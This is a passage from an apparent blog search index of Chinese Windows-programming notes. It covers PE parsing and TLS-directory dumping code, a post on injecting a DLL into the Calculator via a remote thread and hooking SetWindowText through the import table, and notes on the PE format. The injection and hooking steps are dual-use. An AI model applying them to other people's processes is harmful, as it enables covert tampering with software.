? <span class="built_in">sizeof</span>(IMAGE_TLS_DIRECTORY32) : <span class="built_in">sizeof</span>(IMAGE_TLS_DIRECTORY64)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//查看目录大小是否合理</span></span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">Rva2Offset</span><span class="params">(DWORD Rva, UINT_PTR ImageBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WORD i = <span class="number">0</span>;</span><br><span class="line">WORD NumberOfSections = <span class="number">0</span>;</span><br><span class="line">PIMAGE_SECTION_HEADER ImageSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">PIMAGE_NT_HEADERS ImageNtHeaders = (PIMAGE_NT_HEADERS)(ImageBaseAddress + ((PIMAGE_DOS_HEADER)ImageBaseAddress)-&gt;e_lfanew);</span><br><span class="line"><span class="keyword">if</span> (ImageNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) <span class="comment">// PE32</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_NT_HEADERS32 ImageNtHeaders32 = (PIMAGE_NT_HEADERS32)ImageNtHeaders;</span><br><span class="line"></span><br><span class="line">ImageSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&amp;ImageNtHeaders32-&gt;OptionalHeader) + ImageNtHeaders32-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">NumberOfSections = ImageNtHeaders32-&gt;FileHeader.NumberOfSections;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ImageNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) <span class="comment">// PE64</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_NT_HEADERS64 ImageNtHeaders64 = (PIMAGE_NT_HEADERS64)ImageNtHeaders;</span><br><span class="line">ImageSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&amp;ImageNtHeaders64-&gt;OptionalHeader) + ImageNtHeaders64-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">NumberOfSections = ImageNtHeaders64-&gt;FileHeader.NumberOfSections;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Rva &lt; ImageSectionHeader[<span class="number">0</span>].PointerToRawData)</span><br><span class="line"><span class="keyword">return</span> Rva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Rva &gt;= ImageSectionHeader[i].VirtualAddress &amp;&amp; Rva &lt; (ImageSectionHeader[i].VirtualAddress + ImageSectionHeader[i].SizeOfRawData))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (Rva - ImageSectionHeader[i].VirtualAddress + ImageSectionHeader[i].PointerToRawData);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">IsOptionalHeaderPE32Plus</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, BOOL* IsWow64)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//#define IMAGE_ROM_OPTIONAL_HDR_MAGIC   0x107ROM映像不处理</span></span><br><span class="line"><span class="keyword">if</span> (ImageOptionalHeader-&gt;Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// PE32 </span></span><br><span class="line">*IsWow64 = TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ImageOptionalHeader-&gt;Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// PE64</span></span><br><span class="line">*IsWow64 = FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 无法判断 返回失败</span></span><br><span class="line">*IsWow64 = FALSE;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DumpTlsDirectory</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, </span></span></span><br><span class="line"><span class="params"><span class="function">LPBYTE ImageBase, DWORD Offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BOOL IsWow64 = FALSE;</span><br><span class="line"><span class="comment">//判断PE文件的位数</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">IsOptionalHeaderPE32Plus</span>(ImageOptionalHeader, &amp;IsWow64))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IsWow64 == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//x64</span></span><br><span class="line">PIMAGE_TLS_DIRECTORY64 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY64)((DWORD_PTR)ImageBase + (DWORD_PTR)Offset);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;StartAddressOfRawData: %p \r\nEndAddressOfRawData: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;AddressOfIndex: %p \r\nAddressOfCallBacks:%p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;SizeOfZeroFill: %u \r\nCharacteristics: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_TLS_DIRECTORY32 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY32)((DWORD_PTR)ImageBase + (DWORD_PTR)Offset);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;StartAddressOfRawData: %p  \r\nEndAddressOfRawData: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;AddressOfIndex: %p \r\nAddressOfCallBacks:%p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;SizeOfZeroFill: %u \r\nCharacteristics: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内存对齐</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Sub_2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR ImageName[MAX_PATH] = _T(<span class="string">&quot;Test.exe&quot;</span>);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;ImageName: %s \r\n&quot;</span>), ImageName);</span><br><span class="line"></span><br><span class="line">HANDLE FileHandle = INVALID_HANDLE_VALUE;</span><br><span class="line">LPVOID v1 = <span class="literal">NULL</span>;</span><br><span class="line">LPVOID ImageBase = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_NT_HEADERS ImageNtHeaders = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_SECTION_HEADER ImageSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">DWORD FileLength = <span class="number">-1</span>;</span><br><span class="line">DWORD ReturnLength = <span class="number">-1</span>;</span><br><span class="line">DWORD NumberOfSections = <span class="number">-1</span>;</span><br><span class="line">DWORD ImageSize = <span class="number">-1</span>;</span><br><span class="line">DWORD SizeOfImage = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IMAGE_DATA_DIRECTORY ImageDataDirectory = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将整个文件内容读取到内存中      </span></span><br><span class="line">FileHandle = <span class="built_in">CreateFile</span>(ImageName, GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (FileHandle == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;CreateFile() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line">FileLength = <span class="built_in">GetFileSize</span>(FileHandle, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//FileSize = 67072</span></span><br><span class="line"><span class="keyword">if</span> (FileLength == INVALID_FILE_SIZE)<span class="comment">//#define INVALID_FILE_SIZE ((DWORD)0xFFFFFFFF)</span></span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GetFileSize() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line">v1 = <span class="built_in">GlobalAlloc</span>(GMEM_FIXED | GMEM_ZEROINIT, FileLength);</span><br><span class="line"><span class="keyword">if</span> (v1 == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GlobalAlloc() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(FileHandle, v1, FileLength, &amp;ReturnLength, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;ReadFile() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FileLength != ReturnLength)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//FileSize = 67072</span></span><br><span class="line"><span class="comment">//RealReadSize = 67072</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;ReadFile() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得Nt头地址            </span></span><br><span class="line">ImageNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)v1 + ((PIMAGE_DOS_HEADER)v1)-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得节表起始地址</span></span><br><span class="line">ImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)&amp;ImageNtHeaders-&gt;OptionalHeader +</span><br><span class="line">(DWORD_PTR)ImageNtHeaders-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得PE文件中节的个数           </span></span><br><span class="line">NumberOfSections = ImageNtHeaders-&gt;FileHeader.NumberOfSections;</span><br><span class="line"><span class="comment">//NumberOfSections = 11</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//最后一个节的RVA 加上 该节数据相对内存对齐粒度对齐后的值 -&gt; 该PE文件加载到内存后所占内存的总大小     </span></span><br><span class="line">ImageSize = ImageSectionHeader[NumberOfSections - <span class="number">1</span>].VirtualAddress +</span><br><span class="line"><span class="built_in">AlignmentData</span>(ImageSectionHeader[NumberOfSections - <span class="number">1</span>].SizeOfRawData, ImageNtHeaders-&gt;OptionalHeader.SectionAlignment);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ImageOptionalHeader的成员SizeOfImage 内存中PE文件的总大小(必须保证内存对齐)  </span></span><br><span class="line">SizeOfImage = <span class="built_in">AlignmentData</span>(ImageNtHeaders-&gt;OptionalHeader.SizeOfImage,</span><br><span class="line">ImageNtHeaders-&gt;OptionalHeader.SectionAlignment);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通常以上两种方法得到的两个值是相等的,如果不等则取较大的一个       </span></span><br><span class="line"><span class="keyword">if</span> (SizeOfImage &lt; ImageSize)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//ImageSize = 163840</span></span><br><span class="line"><span class="comment">//CalculateImageSize = 163840</span></span><br><span class="line">SizeOfImage = ImageSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//分配内存空间,并将其全部初始化为0          </span></span><br><span class="line">ImageBase = <span class="built_in">GlobalAlloc</span>(GMEM_FIXED | GMEM_ZEROINIT, ImageSize);</span><br><span class="line"><span class="keyword">if</span> (ImageBase == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GlobalAlloc() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将 头+节表 复制到申请的内存中        </span></span><br><span class="line"><span class="built_in">memcpy</span>(ImageBase, v1, ImageNtHeaders-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将各个节数据复制到内存中          </span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>((PBYTE)ImageBase + ImageSectionHeader[i].VirtualAddress,<span class="comment">//节在内存中的起始处(目标)               </span></span><br><span class="line">(PBYTE)v1 + ImageSectionHeader[i].PointerToRawData,<span class="comment">//节在文件中的起始处(源数据)                     </span></span><br><span class="line">ImageSectionHeader[i].SizeOfRawData);<span class="comment">//节数据的大小</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//查找TLS目录的RVA和大小</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">RtlImageDirectoryEntryToData</span>(&amp;ImageNtHeaders-&gt;OptionalHeader, IMAGE_DIRECTORY_ENTRY_TLS,</span><br><span class="line">&amp;ImageDataDirectory))</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GetTlsDirectoryRVA() Error\r\n&quot;</span>));</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//显示TLS目录信息</span></span><br><span class="line"><span class="built_in">DumpTlsDirectory2</span>(&amp;ImageNtHeaders-&gt;OptionalHeader, (LPBYTE)ImageBase,ImageDataDirectory.VirtualAddress);</span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭句柄 释放内存</span></span><br><span class="line"><span class="keyword">if</span> (ImageBase != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">GlobalFree</span>(ImageBase);</span><br><span class="line">ImageBase = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (v1 != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">GlobalFree</span>(v1);</span><br><span class="line">v1 = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FileHandle != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(FileHandle);</span><br><span class="line">FileHandle = INVALID_HANDLE_VALUE;</span><br><span class="line">&#125;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Please Input Anykey to Exit\r\n&quot;</span>));</span><br><span class="line">_gettchar();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DumpTlsDirectory2</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, LPBYTE ImageBase, DWORD VirtualAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BOOL IsWow64 = FALSE;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">IsOptionalHeaderPE32Plus</span>(ImageOptionalHeader, &amp;IsWow64))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IsWow64==FALSE)</span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_TLS_DIRECTORY64 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY64)((DWORD_PTR)ImageBase + (DWORD_PTR)VirtualAddress);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;StartAddressOfRawData: %p \r\nEndAddressOfRawData: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;AddressOfIndex: %p \r\nAddressOfCallBacks:%p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;SizeOfZeroFill: %u \r\nCharacteristics: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_TLS_DIRECTORY32 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY32)((DWORD_PTR)ImageBase + (DWORD_PTR)VirtualAddress);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;StartAddressOfRawData: %p  \r\nEndAddressOfRawData: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;AddressOfIndex: %p \r\nAddressOfCallBacks:%p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;SizeOfZeroFill: %u \r\nCharacteristics: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//以AlignmentLength对齐OperateLength, 让OperateLength为AlignmentLength的整数倍</span></span><br><span class="line"><span class="function">LONGLONG <span class="title">AlignmentData</span><span class="params">(LONGLONG OperateLength, LONGLONG AlignmentLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (AlignmentLength == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> OperateLength;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> v1 = OperateLength % AlignmentLength;</span><br><span class="line"><span class="keyword">if</span> (v1 != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> OperateLength + AlignmentLength - v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> OperateLength;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows Programming </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hook计算器以显示中文数字</title>
      <link href="/2024/02/04/Hook%E8%AE%A1%E7%AE%97%E5%99%A8%E4%BB%A5%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97/"/>
      <url>/2024/02/04/Hook%E8%AE%A1%E7%AE%97%E5%99%A8%E4%BB%A5%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97/</url>
      
        <content type="html"><![CDATA[<h1 id="计算器显示中文数字HookLet"><a href="#计算器显示中文数字HookLet" class="headerlink" title="计算器显示中文数字HookLet"></a>计算器显示中文数字HookLet</h1><p>注入DLL.dll到计算器程序</p><p>找到导入表描述，在FirstThunk中把user32.dll文件中导出函数地址改为自己的DLL.dll导出函数的地址</p><p>计算器点击数字调用的函数为SetWindowText</p><p>注入方式有两种，CreateRemoteThread远程线程，SetWindowHookEx全局钩子</p><p>提权，开启UAC 管理员身份运行</p><p>可以在项目右键属性，链接器，清单文件，打开UAC运行级别即可</p><p><img src="/.io//image-20230118225323796.png" alt="image-20230118225323796"></p><p>这里使用远程线程注入，填写动态库的完整路径申请内存，在对方进程中开启新的线程，得到LoadLibrary地址，执行LoadLibrary加载自己的动态库</p><p>得到自己动态库的完整路径</p><p>得到PID</p><p>申请虚拟内存</p><p>将路径写入虚拟内存</p><p>启动线程</p><p>从目标进程中的user32模块导出表中获取SetWindowText函数地址</p><p>获得进程中第一个模块Taskmgr.exe地址</p><p>定位到导入表描述</p><p>该模块是加载状态的，因此定位到FirstThunk，里面已经变为真正的函数地址，判断是否为空</p><p>定位到模块名</p><p>比较得到与我们要感染的模块相同，此时ImageImportDescriptor指针指向的FirstThunk即为对应模块</p><p><img src="/.io//image-20230119001522337.png" alt="image-20230119001522337"></p><p>获取user32导出表中SetWindowText函数地址</p><p>定位FirstThunk指向的IMAGE_THUNK_DATA，此处就是函数的地址</p><p>遍历这部分IAT表，ImageThunkData-&gt;u1.Function与获取到的地址进行比较</p><p>IAT表不可写，修改内存属性</p><p>API函数入口地址改成我们构造的函数的地址。函数的实际地址是函数指针名加jmp指令E9后的数字再加5</p><p>导入表卸载</p><p><img src="/.io//image-20230119005641578.png" alt="image-20230119005641578"></p><p>修改内存包含属性</p><p>将修改过的地址改为原本的地址</p>]]></content>
      
      
      <categories>
          
          <category> Windows Programming </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PE文件格式</title>
      <link href="/2024/02/04/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
      <url>/2024/02/04/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h1><p><strong>此文章为自查文章，部分内容没有详细解释。具体概念出自李承远《逆向工程核心原理》。</strong></p><p>.exe .dll .sys</p><p>PE或PE+，注意没有PE64</p><p>C:\Windows\system32\notepad.exe &#x2F;&#x2F;32位</p><p>C:\Windows\syswow64\notepad.exe &#x2F;&#x2F;64位</p><p>PE文件的标志</p><p><img src="/.io//image-20220905213538297.png" alt="image-20220905213538297"></p><p>PE格式文件加载到内存中的情形</p><p><img src="/.io//image-20220905213651291.png" alt="image-20220905213651291"></p><p>DOS头 windows.h中有定义  _IMAGE_DOS_HEADE</p><p>NULL区域是未使用的区域用0填充的，补齐文件或内存粒度对齐</p><p><em><em>重点关注0x00 word e_magic&#x3D;0x5a4d 对应MZ, 和dword(long)0x3c e_ifanew, (PIMAGE_NT_HEADERS）(BYTE</em>)ImageDosHeader+(ImagerDosHeader-&gt;e_ifanew)就是NT_Headers的地址</em>* </p><p>64位下的地址为8字节，32位为4字节，如果文件是64位，则4字节定位的地址必为RVA</p><p>32、64位的最大区别是NT_HEADERS后面是否跟数字64</p><p>NtHeaders除了signature签名还有file optional header两个成员，往下是section header signature里是四个字节的dword或long的PE00，即0x005040</p><p><img src="/.io//image-20220905215743384.png" alt="image-20220905215743384"></p><p>VA是虚拟内存的绝对地址，RVA是相对虚拟地址 RVA+ImageBase &#x3D; VA</p><p><img src="/.io//image-20220905220631629.png" alt="image-20220905220631629"></p><p>PE头内部信息大多以RVA形式存在，因为PE文件被加载到内存空间的时候，每一次的绝对地址都是不一样的。32位WindowsOS中，各进程分配有4GB内存，即VA的值最多到FFFFFFFF</p><p>0-2^32-1  0-0xFFFFFFFF-1</p><p>0-2^64-1  0-0xFFFFFFFFFFFFFFFF-1但现在16进制还不使用前四个F。64位下的0是0xFFFF 0000 0000 0000，也就是只用到2^48-1</p><p>文件操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span 